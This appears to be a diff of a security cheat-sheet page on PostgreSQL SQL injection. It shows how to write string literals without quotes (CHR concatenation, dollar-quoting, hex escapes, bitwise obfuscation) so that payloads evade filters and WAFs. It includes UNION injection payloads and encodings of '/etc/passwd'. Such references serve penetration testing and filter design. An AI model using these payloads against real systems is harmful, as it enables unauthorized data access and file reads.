@@ -7,11 +7,9 @@ tags: ["quotes", "evasion", "bypass"]
 lastUpdated: 2025-12-16
 ---
 
-## Avoiding Quotations
-
 In some scenarios, web applications may implement filters that block or sanitize quotation marks (`'` or `"`). These techniques allow you to construct strings without using quotes.
 
-### Using CHR() Function
+## Using CHR() Function
 
 The `CHR()` function converts ASCII values to characters:
 
@@ -25,7 +23,7 @@ SELECT CHR(65);  -- 'A'
 SELECT CHR(66);  -- 'B'
 ```
 
-### Using String Concatenation
+## Using String Concatenation
 
 Combine `CHR()` with the `||` concatenation operator:
 
@@ -38,7 +36,7 @@ SELECT CHR(47)||CHR(101)||CHR(116)||CHR(99)||CHR(47)||CHR(112)||CHR(97)||CHR(115
 -- Result: '/etc/passwd'
 ```
 
-### Using Dollar-Quoting
+## Using Dollar-Quoting
 
 PostgreSQL supports dollar-quoting as an alternative to single quotes:
 
@@ -53,7 +51,7 @@ SELECT $tag$admin$tag$;
 SELECT * FROM users WHERE username = $$admin$$;
 ```
 
-### Using Hexadecimal
+## Using Hexadecimal
 
 PostgreSQL can convert hex to text:
 
@@ -67,7 +65,7 @@ SELECT E'\x61\x64\x6d\x69\x6e';
 -- Result: 'admin'
 ```
 
-### Using ASCII and CHR Functions
+## Using ASCII and CHR Functions
 
 `ASCII()` expects text input and returns its numeric code, while `CHR()` does the reverse—producing a text character from a numeric code. You can avoid explicit quotes by composing `ASCII(CHR(...))`.
 
@@ -79,7 +77,7 @@ SELECT ASCII(CHR(65));  -- Returns 65
 SELECT CHR(65);  -- Returns 'A'
 ```
 
-### Using Bitwise Operations for Obfuscation
+## Using Bitwise Operations for Obfuscation
 
 Bitwise operators can obscure numeric ASCII values to evade pattern-based WAFs:
 
@@ -100,7 +98,7 @@ SELECT CHR(96 | 1) || CHR(50 << 1) || CHR(218 >> 1) || CHR(52 << 1 | 1) || CHR(1
 
 **Operators:** `&` (AND), `|` (OR), `#` (XOR), `~` (NOT), `<<` (left shift), `>>` (right shift)
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Original query using quotes
@@ -116,7 +114,7 @@ SELECT * FROM users WHERE username=$$admin$$;
 ' UNION SELECT NULL,CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110),NULL--
 ```
 
-### Building Common Strings
+## Building Common Strings
 
 | String        | CHR() Equivalent                                                                                                               |
 | ------------- | ------------------------------------------------------------------------------------------------------------------------------ |
@@ -124,7 +122,7 @@ SELECT * FROM users WHERE username=$$admin$$;
 | `root`        | `CHR(114)\|\|CHR(111)\|\|CHR(111)\|\|CHR(116)`                                                                                 |
 | `/etc/passwd` | `CHR(47)\|\|CHR(101)\|\|CHR(116)\|\|CHR(99)\|\|CHR(47)\|\|CHR(112)\|\|CHR(97)\|\|CHR(115)\|\|CHR(115)\|\|CHR(119)\|\|CHR(100)` |
 
-### Notes
+## Notes
 
 - PostgreSQL's `CHR()` function is similar to MySQL's `CHAR()` string function
 - Dollar-quoting is PostgreSQL-specific and very useful for bypass
